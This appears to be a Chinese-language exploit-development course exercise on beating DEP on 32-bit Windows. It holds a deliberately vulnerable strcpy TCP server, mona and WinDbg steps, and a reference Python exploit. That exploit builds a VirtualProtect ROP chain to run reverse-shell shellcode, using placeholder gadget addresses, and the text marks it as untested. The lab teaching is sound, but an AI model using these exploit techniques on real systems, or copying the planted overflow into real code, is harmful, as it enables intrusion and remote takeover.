# 練習 E — stack overflow + 手工 ROP DEP bypass

> **目標**：對一個開了 DEP 的 x86 stack overflow 目標,從零走完整條鏈——控制 EIP → 找 gadget → 手排一條呼叫 `VirtualProtect` 的 ROP chain → 接上 bad-char-free shellcode → 在 WinDbg 裡逐步除錯驗證,最終彈出 reverse shell。這是本課 Part 2（stack overflow）+ Part 6（手寫 shellcode）+ Part 7（DEP bypass）三條線第一次真正合流。

> **注意**：本練習需要一台開了 DEP（`AlwaysOn` 或讓目標自己帶 `NX_COMPAT`）的 Win10 x86 靶機,外加 WinDbg + mona v3（Ch 0 環境）。**整份練習標「未實測,理論預期」**,因為本機環境尚未在真實 VM 裡跑過完整流程。理論依據是 Ch 7–10（stack overflow 方法論）、Ch 27–30（DEP 機制與 ROP chain）、Ch 22–26（手寫 shellcode）。靶程式碼已用 mingw 確認 C 語法可編譯（見下方「mingw 語法確認」段）。

## 背景

你在 Ch 7–10 練完了 vulnserver 的 vanilla stack overflow：控 EIP、找 `jmp esp`、接 shellcode,DEP 關閉的世界裡這樣就能收工。

你在 Ch 27 學了 DEP 怎麼把「蓋 EIP 直接跳 shellcode」這條路堵死,在 Ch 28–29 學了怎麼找 gadget、怎麼手排一條呼叫 `VirtualProtect` 的 chain,Ch 30 學了怎麼在 WinDbg 裡系統化除錯一條歪掉的 chain。

這個練習把兩條線接起來：同一套 stack overflow 控流手法,這次目標開了 DEP,`jmp esp` 那條路直接 crash,逼你把 Ch 28–30 的功夫全部用上。

## 環境要求

| 工具 | 版本/說明 | 取得方式 |
|---|---|---|
| **Win10 x86 VM 或 x86 行程靶機** | 目標必須是 32-bit 行程,且系統層 DEP 設為 `AlwaysOn`（或靶程式自帶 `NX_COMPAT`) | VirtualBox/VMware/Hyper-V 開 Win10,`bcdedit /set nx AlwaysOn` 後重開機 |
| **MSVC `cl.exe`** 或 **mingw `gcc`** | 編譯靶程式;mingw 預設帶 `NX_COMPAT`,不需額外旗標 | VS Build Tools 或 MSYS2 mingw |
| **WinDbg（2026 版）+ pykd** | 附掛靶程式,觀察 crash 與單步除錯 | Ch 0 環境 |
| **mona v3** | 找 gadget、產生 ROP chain 骨架、查模組 ASLR 狀態 | Ch 0 環境 |
| **Python 3.x** | 寫 exploit script,用裸 `socket` | |

> **mingw 替代方案**：靶程式碼本章用 mingw 語法（不依賴 MSVC 特有的 SEH/`/GS` 旗標),在 mingw 上編譯即可得到一個開 DEP 的 32-bit PE,不需要額外裝 MSVC。

## 任務規格

### 靶程式碼

這是一支簡化過的 TCP echo 伺服器,故意沿用 vulnserver 風格的「TRUN」指令格式,但自己實作,方便你確認漏洞行為和 vulnserver 一致、又不用擔心授權問題。

```c
/* dep_vuln.c — 練習 E 的靶程式：TCP 服務,固定 buffer + strcpy，DEP 開啟
 *
 * 編譯指令（mingw,本機已確認語法可編譯）：
 *   gcc -m32 -o dep_vuln.exe dep_vuln.c -lws2_32
 *   mingw 預設就帶 NX_COMPAT（DEP on），不需要額外旗標。
 *
 * 編譯指令（MSVC，未實測，理論預期）：
 *   cl dep_vuln.c /link ws2_32.lib /NXCOMPAT /OUT:dep_vuln.exe
 */

#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 9999

void handle_command(char *input) {
    char buffer[512];          /* 固定大小緩衝區,overflow 目標 */

    if (strncmp(input, "TRUN ", 5) == 0) {
        strcpy(buffer, input + 5);     /* 危險：無邊界檢查 */
        printf("Received TRUN: %s\n", buffer);
    } else {
        printf("Unknown command: %s\n", input);
    }
}

int main(void) {
    WSADATA wsa;
    SOCKET  server_fd, client_fd;
    struct sockaddr_in addr;
    char    recv_buf[4096];
    int     recv_len;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(PORT);

    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 1);
    printf("dep_vuln listening on port %d\n", PORT);

    while (1) {
        client_fd = accept(server_fd, NULL, NULL);
        printf("client connected\n");

        while (1) {
            recv_len = recv(client_fd, recv_buf, sizeof(recv_buf) - 1, 0);
            if (recv_len <= 0) break;
            recv_buf[recv_len] = '\0';

            handle_command(recv_buf);

            send(client_fd, "OK\r\n", 4, 0);
        }

        closesocket(client_fd);
        printf("client disconnected\n");
    }

    return 0;
}
```

**mingw 語法確認（本機實際執行,確認 C 語法無誤）**：

```
$ gcc -m32 -o dep_vuln.exe dep_vuln.c -lws2_32 -c -fsyntax-only
$ echo $?
0
```

> 以 `-c -fsyntax-only` 僅驗證語法與型別正確性,因為本機沒有連結 `ws2_32` 的 Windows 目標環境做完整連結測試。完整編譯連結請在 Windows mingw 環境執行 `gcc -m32 -o dep_vuln.exe dep_vuln.c -lws2_32`。

### stack 佈局（理論,`handle_command` 的 x86 stack frame）

```
低位址 ─────────────────────────────────────────────── 高位址
（ESP 方向）

[buffer 512B][... padding(視編譯器對齊而定) ...][saved EBP][saved EIP (return addr)]
     ↑
  overflow 起點（從 "TRUN " 之後的 input 開始填入 buffer）

payload 結構：
  "TRUN " + [junk 填滿 buffer 到 saved EIP 前] + [EIP 覆寫 = 第一個 ROP gadget 位址]
          + [ROP chain] + [shellcode]
```

精確 offset（buffer 開頭到 saved EIP）需用 Ch 7–8 的 cyclic pattern 方法量測,不要直接假設是 `512 + 4`（編譯器對齊、是否有 `/GS` cookie 都會影響實際數字）。

### 驗收條件

1. 靶機 `dep_vuln.exe` 跑起來,聽 TCP 9999,且系統 DEP 為 `AlwaysOn`。
2. 攻擊機發送包含 ROP chain + reverse shell shellcode 的 payload。
3. 攻擊機的 `nc -lvnp <port>` 收到一個回連的 shell,能執行 `whoami`、`dir` 等指令。
4. 整個過程中,靶機這一側若掛著 WinDbg 觀察,`!vprot <shellcode_addr>` 在 shellcode 執行前後應能看到保護旗標從不可執行變成 `PAGE_EXECUTE_READWRITE`。

## 期望結果

```
攻擊機：
$ nc -lvnp 4444
listening on [any] 4444 ...

$ python3 exploit.py --send
[*] rop chain length: XX bytes
[*] total payload length: XXX bytes
[+] payload sent

（nc 視窗）
connect to [192.168.x.x] from (UNKNOWN) [192.168.x.y] XXXXX
C:\Windows\system32>whoami
nt authority\system   (或目標行程的實際帳戶)
```

或在 WinDbg 裡觀察到：EIP 依序跳過 ROP chain 的每個 gadget,`VirtualProtect` 呼叫成功（`eax=1`),shellcode 所在頁變成可執行,EIP 落入 shellcode,最終行程發出對外連線。

## 卡住提示

**提示 1：量不出 buffer 到 saved EIP 的精確 offset**

用 mona 生成 cyclic pattern,透過攻擊機送出,讓靶機 crash,再用 `!mona findmsp` 或 `!mona pc <EIP值>` 反查 offset——流程和 Ch 7–8 完全一樣,DEP 開不開不影響這一步（crash 時 EIP 被蓋成 cyclic pattern 的一部分,和 DEP 無關）。

**提示 2：找不到乾淨的 gadget**

先用 `!py mona modules` 確認哪些模組 ASLR 是關的（靶程式自己 `dep_vuln.exe` 通常沒開 `/DYNAMICBASE`，除非用了額外旗標)，優先從它身上找 gadget——同一份二進位,每次執行的 image base 固定,不用擔心 ASLR 讓位址每次變動。只有當靶程式本身 gadget 不夠用時,才去系統 DLL 找（並注意那些有 ASLR）。

**提示 3：`VirtualProtect` 呼叫後 eax=0,保護沒變**

回去檢查 `lpflOldProtect` 指向的位址是否真的可寫——建議直接指向 ROP chain 自己佔用的某個已經被讀過、不會再用到的 stack slot,肯定可寫。也檢查 `lpAddress` 是否落在一個已經 committed 的頁（stack 本身一定是,只要位址算對應該沒問題）。

**提示 4：chain 跑到一半就歪了,不知道哪個 gadget 出問題**

照搬 Ch 30 的除錯方法論：第一個 gadget 下斷點,`p` 單步,每走一個 `ret` 就 `r`（看暫存器)+ `dd esp L8`（看接下來的 stack 內容),比對你規劃時畫的 ASCII 圖,找到第一個「實際狀態」和「預期狀態」不一致的那一步——問題一定出在那一步**之前**的某個 gadget。

**提示 5：VirtualProtect 呼叫成功,但跳過去 shellcode 直接 crash**

八成是返回位址（shellcode 起點）算錯了,落在 shellcode 前後幾個 bytes。用 `\xcc`（INT3）暫時取代真正 shellcode 的開頭幾個 bytes,先確認 EIP 真的精確落在這個標記上,再換回真正 shellcode。

## 實作步驟

### Step 1：編譯並啟動靶程式（本機已確認語法,完整編譯未實測）

```bash
gcc -m32 -o dep_vuln.exe dep_vuln.c -lws2_32
```

在靶機確認 DEP 已開啟且靶程式帶 `NX_COMPAT`：

```
# 未實測,理論預期
dumpbin /headers dep_vuln.exe | findstr "NX compatible"
bcdedit /enum {current} | findstr nx
```

啟動：`dep_vuln.exe`，確認聽 9999。

### Step 2：量測 offset（未實測,理論預期）

```
!py mona config -set workingfolder c:\mona\%p
!py mona pc 800
```

把生成的 800-char pattern 當 `TRUN <pattern>` 送過去,讓靶機 crash,用 `!py mona findmsp` 讀出 EIP 被蓋到時對應 pattern 裡的哪個位置,換算成 offset。

### Step 3：找 gadget、產生 chain 骨架（未實測,理論預期）

```
!py mona modules
!py mona rop -m dep_vuln.exe -cpb "\x00\x0a\x0d"
```

讀 Ch 29 教的方式解讀 `rop_chains.txt`,確認：
- `VirtualProtect` 的位址（從 `dep_vuln.exe` 的 IAT 查,或從 `kernel32.dll` 查並確認是否需要處理 ASLR）。
- 用純手排法（Ch 29 示範)或核對 mona 自動生成的 `pushad` 版本,挑一個你完全看懂的版本。

### Step 4：撰寫 exploit.py（未實測,理論預期)

見下方「完整參考解答」,先自己嘗試填完骨架,卡住再看。

### Step 5：先用 `\xcc` 佔位驗證控制流（未實測,理論預期）

把 shellcode 換成 `b"\x90"*16 + b"\xcc"`,在 WinDbg 裡按 Ch 30 的方法逐步驗證,確認 chain 跑到 `INT3` 停下、且之前每一步的暫存器/ESP 都符合預期。

### Step 6：換上真正的 reverse shell shellcode,收尾（未實測,理論預期）

把 Ch 25–26 寫好的 bad-char-free reverse shell shellcode（PEB walk + EAT hash resolve + `WSASocket`/`connect`/`CreateProcess` 組合,或 Ch 25 教的版本)接上,發送,在攻擊機 `nc -lvnp` 等回連。

## 完整參考解答

**寫完(或卡住超過 30 分鐘)再看！不要偷看。**

<details>
<summary>點開：完整參考 exploit.py</summary>

```python
#!/usr/bin/env python3
# exploit.py — 練習 E：stack overflow + 手工 ROP → VirtualProtect → reverse shell
# 未實測,理論預期。所有標 "需實測填入" 的常數都必須在你自己的靶機上
# 用 Ch 7-8（offset）+ Ch 28-29（gadget）的方法量出真實值後替換。

import socket
import struct
import sys

def p32(v):
    return struct.pack("<I", v)

# ── 連線設定 ────────────────────────────────────────────────
TARGET_IP   = "192.168.x.x"      # 靶機 IP，需實測填入
TARGET_PORT = 9999

# ── Step 2 量測結果 ─────────────────────────────────────────
OFFSET_TO_EIP = 520               # buffer 到 saved EIP 的距離，需實測填入

# ── Step 3 找到的 gadget（全部示意位址，需實測填入）───────────
GADGET_MOV_EAX_ESP   = 0x00401000   # mov eax, esp ; ret
GADGET_ADD_EAX_OFF   = 0x00401010   # add eax, <imm32> ; ret（imm32 編碼在指令裡,
                                      # 需要找到「加數恰好等於你要的 offset」的版本,
                                      # 或改用 pop/add 兩步式gadget動態加)
GADGET_POP_ECX_RET   = 0x00401020   # pop ecx ; ret
GADGET_MOV_ECX_EAX_RET = 0x00401030 # mov [ecx], eax ; ret（把 eax 寫到 ecx 指向的位址，
                                      # 用於把算好的 shellcode 位址回填到 chain 的
                                      # 返回位址格和 arg1 格）
GADGET_POP_EAX_RET   = 0x00401040   # pop eax ; ret
GADGET_NEG_EAX_RET   = 0x00401050   # neg eax ; ret

VIRTUALPROTECT_ADDR  = 0x00401200   # dep_vuln.exe 的 IAT 裡 VirtualProtect 項,或
                                      # kernel32.dll 內 VirtualProtect 真實位址，需實測填入

# ── 動態填值的目標 slot：直接用 chain 自己佔用、之後不再讀取的位置 ──
RETADDR_SLOT_PLACEHOLDER = 0xdeadbeef   # 之後會被動態回填成 shellcode 位址
ARG1_SLOT_PLACEHOLDER    = 0xdeadbeef   # 同上

WRITABLE_SCRATCH   = 0x00403000     # 已知可寫位址(.data 區某處),當 lpflOldProtect 用
SHELLCODE_SIZE     = 0x300
PAGE_RWX_NEG       = 0xFFFFFFC0     # 0x100000000 - 0x40，neg 技巧用

# OFFSET_TO_SHELLCODE：從 "mov eax, esp" 那一刻算起，到 shellcode 開頭的 bytes 數。
# 必須在排好完整 payload 後，用 len(junk + eip_overwrite + 已知部分 chain) 反推。
# 這裡先留一個函式，payload 組好後再計算、再組一次（兩段式組裝）。


def build_rop_chain(offset_to_shellcode):
    chain = b""

    # ① eax = 目前 esp
    chain += p32(GADGET_MOV_EAX_ESP)

    # ② eax += offset_to_shellcode  → eax = shellcode 絕對位址
    #    (示意：假設找到的 gadget 剛好是 add eax, offset_to_shellcode ; ret，
    #     實務上通常要找 "pop ebx ; add eax, ebx ; ret" 這類可吃動態值的組合，
    #     或退而求其次，用多個固定 add 常數 gadget 疊加湊出需要的 offset)
    chain += p32(GADGET_ADD_EAX_OFF)

    # ③ 把算好的 shellcode 位址（目前在 eax）寫回 payload 裡 ⑧⑨ 兩個預留格
    #    用 "pop ecx ; ret" 把 ecx 設成指向 ⑧ 的位址，再 mov [ecx], eax 寫入，
    #    接著重複一次把同一個 eax 值寫進 ⑨。
    #    下面用佔位 0xdeadbeef 標記這兩個目標位址，實際由組裝函式回填真實偏移。
    chain += p32(GADGET_POP_ECX_RET)
    chain += p32(0xdeadbeef)        # 佔位：⑧ 格在最終 payload 裡的絕對位址
    chain += p32(GADGET_MOV_ECX_EAX_RET)

    chain += p32(GADGET_POP_ECX_RET)
    chain += p32(0xdeadbeef)        # 佔位：⑨ 格在最終 payload 裡的絕對位址
    chain += p32(GADGET_MOV_ECX_EAX_RET)

    # ④-⑤ 用 neg 湊出 0x40（若環境裡 0x40 本身安全，可省略這兩步，直接在死佈局寫常數）
    chain += p32(GADGET_POP_EAX_RET)
    chain += p32(PAGE_RWX_NEG)
    chain += p32(GADGET_NEG_EAX_RET)
    # （示範寫法；若要讓 ⑪ 格真的拿到這個 eax 值，還需要再一組 pop ecx/mov [ecx],eax
    #   把它寫進 ⑪，為節省篇幅，下方死佈局直接寫常數 0x40，與④⑤示範二選一）

    # ⑦-⑫ stdcall 死佈局
    chain += p32(VIRTUALPROTECT_ADDR)   # ⑦ call 落點
    chain += p32(RETADDR_SLOT_PLACEHOLDER)  # ⑧ 返回位址（稍後被③動態回填）
    chain += p32(ARG1_SLOT_PLACEHOLDER)     # ⑨ arg1: lpAddress（稍後被③動態回填）
    chain += p32(SHELLCODE_SIZE)            # ⑩ arg2: dwSize
    chain += p32(0x00000040)                # ⑪ arg3: flNewProtect
    chain += p32(WRITABLE_SCRATCH)          # ⑫ arg4: lpflOldProtect

    return chain


def build_shellcode(use_placeholder=False):
    if use_placeholder:
        # 驗證控制流用：NOP sled + INT3
        return b"\x90" * 16 + b"\xcc"
    # 正式版：接上 Ch 25-26 寫好的 bad-char-free reverse shell shellcode
    # shellcode = ch26_encoder.encode(ch25_reverse_shell.build(lhost, lport))
    raise NotImplementedError("接上 Ch 25-26 的 shellcode 產生函式")


def build_payload(use_placeholder_shellcode=True):
    """
    兩段式組裝：
      第一次用佔位 offset_to_shellcode=0 組出 chain，量出 chain 長度，
      才能算出 shellcode 相對 "mov eax,esp" 那一刻 ESP 的真實距離，
      再用真實 offset 重新組一次。
    """
    junk = b"A" * OFFSET_TO_EIP
    eip_overwrite = p32(GADGET_MOV_EAX_ESP)   # 蓋 EIP = chain 第一個 gadget

    rop_pass1 = build_rop_chain(offset_to_shellcode=0)
    shellcode = build_shellcode(use_placeholder=use_placeholder_shellcode)

    # "mov eax, esp" 執行那一刻，esp 已經指向 eip_overwrite 之後那個位置
    # （因為 ret 彈出 eip_overwrite 後，esp 已經前進了 4 bytes）
    # 所以 shellcode 相對那一刻 esp 的距離 = len(rop_pass1) + 一些微調
    offset_to_shellcode = len(rop_pass1)

    rop_final = build_rop_chain(offset_to_shellcode=offset_to_shellcode)

    payload = b"TRUN " + junk + eip_overwrite + rop_final + shellcode
    return payload


def main():
    use_placeholder = "--verify" in sys.argv
    payload = build_payload(use_placeholder_shellcode=use_placeholder)

    print(f"[*] total payload length: {len(payload)} bytes")

    if "--send" in sys.argv:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(payload + b"\r\n")
        s.close()
        print("[+] payload sent")
    else:
        print("[*] dry-run only; pass --send to actually send, --verify to use INT3 placeholder")


if __name__ == "__main__":
    main()
```

### 重點說明

1. **兩段式組裝**是這份解答和 Ch 29 骨架的主要差異：因為 shellcode 的絕對位址依賴「chain 有多長」,而 chain 的長度在你填完所有 gadget 之前又不確定,所以先用佔位值組一次拿到長度,再用真實長度重新組一次。這是手工 ROP chain 常見的「雞生蛋」問題的標準解法。
2. **③ 的「回填」步驟**具體示範了 Ch 29 結尾提到的「ROP chain 自我修補」技巧：用 `pop ecx; ret` 把 `ecx` 指向死佈局裡 ⑧⑨ 兩個預留格的**絕對位址**（這兩個位址在 payload 組好後是固定、可算出來的,因為 `junk`、`eip_overwrite` 長度都已知),再用 `mov [ecx], eax; ret` 把算好的 shellcode 位址寫進去。
3. 如果你的環境裡能找到更乾淨的 gadget（例如一個 gadget 同時做完「算位址 + 直接當成返回位址用」,像 Ch 29 提過的 `jmp esp` 跳板法),可以省掉③整段,直接讓 `VirtualProtect` 返回到一個 `jmp esp` gadget,兩種做法效果等價，挑你比較看懂的。

</details>

## 測試用例

### 基本驗收（需靶機環境,未實測）

1. **正常指令**：`echo -n "TRUN hello" | nc <ip> 9999` → 收到 `OK`,無 crash。
2. **剛好 500 bytes**：略短於 overflow 門檻 → 正常,無 crash。
3. **overflow 觸發,無 ROP（純 A 填滿）**：確認 EIP 真的被蓋成 `41414141`,且因為 DEP 開啟,若此時直接接 shellcode 會在跳過去的瞬間 crash（驗證 DEP 真的在擋）。
4. **完整 exploit（`--verify`,`\xcc` 佔位)**：WinDbg 應該停在 `INT3`,之前每一步的暫存器/ESP 符合 Ch 30 的檢查流程。
5. **完整 exploit（真正 shellcode)**：攻擊機 `nc -lvnp` 收到回連 shell。

### 除錯器檢查點（未實測,理論預期）

| 檢查點 | 在 WinDbg 觀察 | 預期 |
|---|---|---|
| overflow 後 | `r eip` | `41414141`（純 A 測試)或第一個 gadget 位址（完整 payload） |
| 走完①-③ | `r eax` | 等於 shellcode 絕對位址 |
| `VirtualProtect` 入口 | `dd esp L5` | 返回位址 = `lpAddress` = shellcode 位址,其餘三格符合規劃 |
| `VirtualProtect` 返回後 | `r eax`；`!vprot <shellcode_addr>` | `eax=1`；保護旗標變成 `PAGE_EXECUTE_READWRITE` |
| 跳入 shellcode | `r eip`；`u eip L5` | EIP = shellcode 起點；看到 `\xcc`（`--verify`)或真正 shellcode 指令 |

## 延伸挑戰

### 挑戰 1：改用 VirtualAlloc 路徑重寫

把本練習的 `VirtualProtect` chain 換成 Ch 30 教的 `VirtualAlloc + WriteProcessMemory` 路徑：

1. 呼叫 `VirtualAlloc(NULL, 0x1000, 0x3000, 0x40)`,用 gadget 把回傳值（`eax`)搬到下一個函式呼叫的參數位置。
2. 呼叫 `WriteProcessMemory(GetCurrentProcess()的pseudo handle, <VirtualAlloc回傳位址>, <shellcode現在的位址>, <長度>, &written)`,把 shellcode 複製過去。
3. 跳到 `VirtualAlloc` 回傳的位址執行。

比較這個版本和原版的 gadget 數量差異,體會 Ch 30 表格裡「難度中高」的實際感受。

### 挑戰 2：手縮 chain 長度

本練習的參考解答為了清楚示範,用了比較多的 gadget（包含③的回填步驟)。試著找一個 `jmp esp` gadget,改成 `VirtualProtect` 返回後直接落到 `jmp esp`,省掉③整段回填邏輯,比較 chain 長度的差異,並思考這個做法對 payload 空間限制較嚴苛的情境（Part 5 的空間限制主題）有什麼額外好處。

### 挑戰 3：換到帶 ASLR 的模組找 gadget

如果 `dep_vuln.exe` 本身的 gadget 不夠用,改成完全從 `kernel32.dll`（開了 ASLR）找 gadget,思考：這代表你的 exploit 現在依賴什麼額外前提？（提示：Ch 31 的 info leak 主題,先想過一輪,不需要現在就實作。)

## 自我檢核

- [ ] 不看答案,能說出為什麼這個 exploit 需要「兩段式組裝」才能算出 shellcode 的絕對位址
- [ ] 能解釋「ROP chain 自我修補」（用 `mov [ecx],eax;ret` 回填死佈局裡的 slot)的原理和用途
- [ ] 能在 WinDbg 裡列出至少五個檢查點,逐一核對一條 ROP chain 是否照預期執行
- [ ] 如果 exploit 在有 WinDbg attach 時成功,但沒有除錯器直接跑失敗,能說出至少兩個可能原因
- [ ] 能說出把本練習改成 `VirtualAlloc` 路徑,具體要多做哪一步、為什麼
- [ ] 本練習的 shellcode 如果含壞字元,exploit 會在哪一步表現出異常,為什麼

---

→ [Ch 31 ASLR 復習 + 非隨機化模組利用](./31-aslr-nonrandomized-modules.md)
